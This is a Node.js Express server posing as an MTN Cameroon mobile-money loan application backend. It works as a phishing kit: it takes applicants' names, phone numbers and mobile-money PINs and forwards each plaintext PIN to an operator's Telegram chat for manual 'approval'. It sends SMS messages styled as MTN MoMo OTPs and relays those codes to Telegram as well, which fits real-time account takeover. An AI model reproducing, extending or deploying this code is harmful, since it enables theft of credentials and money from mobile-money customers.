require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend')));

// ─── Configuration ───
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const SMS_GATEWAY_URL = process.env.SMS_GATEWAY_URL;
const SMS_GATEWAY_API_KEY = process.env.SMS_GATEWAY_API_KEY;

// ─── In-Memory Store ───
const applications = {};   // appId -> application data
const appRefs = {};        // short ref -> appId

// ─── Helpers ───
function generateAppRef(appId) {
  const ref = Math.random().toString(36).substring(2, 8).toUpperCase();
  appRefs[ref] = appId;
  return ref;
}

async function sendTelegramMessage(message, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const body = { chat_id: TELEGRAM_CHAT_ID, text: message };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  try {
    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await response.json();
    if (!data.ok) console.error('Telegram API error:', data);
    else console.log('✅ Telegram message sent');
  } catch (e) {
    console.error('Telegram send error:', e);
  }
}

async function sendSms(to, text) {
  if (!SMS_GATEWAY_URL || !SMS_GATEWAY_API_KEY) {
    console.error('❌ SMS gateway not configured');
    return;
  }
  try {
    await axios.post(`${SMS_GATEWAY_URL}/sms`, {
      to,
      text
    }, {
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': SMS_GATEWAY_API_KEY
      }
    });
    console.log(`✅ SMS sent to ${to}: ${text}`);
  } catch (error) {
    console.error(`❌ SMS failed to ${to}:`, error.message);
  }
}

// ─── API Routes ───

// Health check
app.get('/api/health', (req, res) => res.json({ ok: true }));

// Submit loan application (MTN Cameroon)
app.post('/api/send-application', async (req, res) => {
  try {
    const data = req.body.applicationData;
    if (!data || !data.phone || !data.firstName) {
      return res.status(400).json({ ok: false, error: 'Missing required fields' });
    }

    const appId = `${data.phone}_${Date.now()}`;
    const ref = generateAppRef(appId);

    applications[appId] = {
      ...data,
      appStatus: 'pending',
      pinStatus: 'pending',
      otpStatus: 'pending',
      pinAttempts: 0,
      maxPinAttempts: 3,
      pinBlockedUntil: null,
      createdAt: new Date().toISOString()
    };

    const message = `🔵 *NEW LOAN APPLICATION (CAMEROON)*\n────────────────────\n🆔 ID: ${appId}\n📱 Phone: +237${data.phone}\n💰 Amount: XAF ${data.loanAmount.toLocaleString()}\n⏳ Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n✅ *Please approve or reject this application:*`;
    const buttons = [[
      { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'APP', ref }) },
      { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'APP', ref }) }
    ]];

    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, applicationId: appId, status: 'waiting_app_approval' });
  } catch (error) {
    console.error('Error in /api/send-application:', error);
    res.status(500).json({ ok: false, error: error.message });
  }
});

// Send PIN (user submits PIN)
app.post('/api/send-pin', async (req, res) => {
  try {
    const { applicationId, pin } = req.body;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

    if (app.appStatus !== 'approved') {
      return res.status(400).json({ ok: false, error: 'Application not yet approved' });
    }

    if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
      return res.status(429).json({ ok: false, blocked: true, message: 'Too many attempts. Please wait 5 minutes.' });
    }
    if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
      app.pinAttempts = 0;
      app.pinBlockedUntil = null;
    }

    app.pin = pin;
    app.pinStatus = 'pending';

    let ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
    if (!ref) ref = generateAppRef(applicationId);

    const message = `🔐 *PIN VERIFICATION (CAMEROON)*\n────────────────────\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Please approve or reject this PIN:*`;
    const buttons = [[
      { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'PIN', ref }) },
      { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'PIN', ref }) }
    ]];

    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, status: 'pending' });
  } catch (error) {
    console.error('Error in /api/send-pin:', error);
    res.status(500).json({ ok: false, error: error.message });
  }
});

// Send OTP (after PIN approved, generate OTP, send SMS, notify admin)
app.post('/api/send-otp', async (req, res) => {
  try {
    const { applicationId } = req.body;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

    if (app.pinStatus !== 'approved') {
      return res.status(400).json({ ok: false, error: 'PIN not yet approved' });
    }

    // Generate new OTP (4-digit)
    const newOtp = Math.floor(1000 + Math.random() * 9000).toString();
    app.otp = newOtp;
    app.otpStatus = 'pending';

    // 📲 Send SMS to user's phone (Cameroon: +237)
    const userPhone = `+237${app.phone}`;
    await sendSms(userPhone, `Your MTN MoMo OTP is ${newOtp}. Do not share.`);

    // 🔔 Notify admin via Telegram
    let ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
    if (!ref) ref = generateAppRef(applicationId);

    const message = `🔑 *OTP VERIFICATION (CAMEROON)*\n────────────────────\n🆔 ID: ${applicationId}\n📱 Phone: +237${app.phone}\n🔢 OTP: ${newOtp}\n\n✅ *Please approve or reject this OTP:*`;
    const buttons = [[
      { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref }) },
      { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref }) }
    ]];

    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, status: 'pending' });
  } catch (error) {
    console.error('Error in /api/send-otp:', error);
    res.status(500).json({ ok: false, error: error.message });
  }
});

// Resend OTP
app.post('/api/resend-otp', async (req, res) => {
  try {
    const { applicationId } = req.body;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

    // Generate new OTP
    const newOtp = Math.floor(1000 + Math.random() * 9000).toString();
    app.otp = newOtp;
    app.otpStatus = 'pending';

    // 📲 Send SMS again
    const userPhone = `+237${app.phone}`;
    await sendSms(userPhone, `Your MTN MoMo OTP is ${newOtp}. Do not share.`);

    // 🔔 Notify admin
    let ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
    if (!ref) ref = generateAppRef(applicationId);

    const message = `🔄 *OTP RESENT - ADMIN ACTION REQUIRED (CAMEROON)*\n────────────────────\n🆔 ID: ${applicationId}\n📱 Phone: +237${app.phone}\n🔢 New OTP: ${newOtp}\n\n✅ *Please approve or reject this new OTP:*`;
    const buttons = [[
      { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref }) },
      { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref }) }
    ]];

    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, status: 'otp_resent' });
  } catch (error) {
    console.error('Error in /api/resend-otp:', error);
    res.status(500).json({ ok: false, error: error.message });
  }
});

// Status check
app.get('/api/status/:applicationId/:step', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  let status = 'pending';
  let remainingAttempts = null;
  let blocked = false;

  if (req.params.step === 'app') status = app.appStatus;
  else if (req.params.step === 'pin') {
    status = app.pinStatus;
    remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
    blocked = app.pinStatus === 'blocked' || (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date());
  }
  else if (req.params.step === 'otp') status = app.otpStatus;

  res.json({ ok: true, status, remainingAttempts, blocked });
});

// Telegram webhook (admin approval)
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;
  console.log('📩 Webhook received');

  if (update.callback_query) {
    const query = update.callback_query;
    let callbackData;
    try { callbackData = JSON.parse(query.data); } catch (e) { return res.sendStatus(200); }

    const { a, s, ref } = callbackData;
    const appId = appRefs[ref];
    const app = applications[appId];
    if (!app) return res.sendStatus(200);

    if (s === 'APP') {
      app.appStatus = a === 'YES' ? 'approved' : 'rejected';
    } else if (s === 'PIN') {
      if (a === 'YES') app.pinStatus = 'approved';
      else {
        app.pinAttempts = (app.pinAttempts || 0) + 1;
        if (app.pinAttempts >= app.maxPinAttempts) {
          app.pinStatus = 'blocked';
          app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
        } else {
          app.pinStatus = 'rejected';
        }
      }
    } else if (s === 'OTP') {
      app.otpStatus = a === 'YES' ? 'approved' : 'rejected';
    }

    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a}` })
    });

    await sendTelegramMessage(`Status Update (CAMEROON)\nID: ${appId}\nStep: ${s}\nAction: ${a}`);
    return res.sendStatus(200);
  }

  if (update.message && update.message.text) {
    const text = update.message.text.trim();
    const chatId = update.message.chat.id;

    if (chatId.toString() === TELEGRAM_CHAT_ID) {
      if (text === '/stats') {
        const total = Object.keys(applications).length;
        await sendTelegramMessage(`Total applications: ${total}`);
      } else if (text === '/list') {
        const ids = Object.keys(applications).slice(-5);
        let msg = 'Recent applications:\n';
        ids.forEach(id => {
          const app = applications[id];
          msg += `${id} – ${app.phone} (APP: ${app.appStatus}, PIN: ${app.pinStatus}, OTP: ${app.otpStatus})\n`;
        });
        await sendTelegramMessage(msg || 'No applications yet.');
      } else if (text === '/help') {
        await sendTelegramMessage('Commands: /stats, /list, /status');
      }
    }
  }

  res.sendStatus(200);
});

// Serve frontend fallback
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 MTN Cameroon server running on port ${PORT}`);
});
